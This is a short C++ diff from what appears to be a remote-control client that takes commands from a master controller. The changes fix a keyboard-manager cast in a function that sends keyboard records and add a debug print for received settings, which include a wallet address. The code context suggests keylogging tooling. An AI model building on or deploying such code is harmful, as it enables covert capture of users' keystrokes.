@@ -228,7 +228,7 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
 
 DWORD WINAPI SendKeyboardRecord(LPVOID lParam)
 {
-    CManager* pMgr = (CManager*)lParam;
+    CKeyboardManager1* pMgr = (CKeyboardManager1*)lParam;
     if (pMgr) {
         pMgr->Reconnect();
         pMgr->Notify();
@@ -593,6 +593,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     case CMD_MASTERSETTING:
         if (ulLength > MasterSettingsOldSize) {
             memcpy(&m_settings, szBuffer + 1, ulLength > sizeof(MasterSettings) ? sizeof(MasterSettings) : MasterSettingsOldSize);
+            Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds\n", ulLength - 1, m_settings.ReportInterval);
             iniFile cfg(CLIENT_PATH);
             cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
             CManager* pMgr = (CManager*)m_hKeyboard->user;
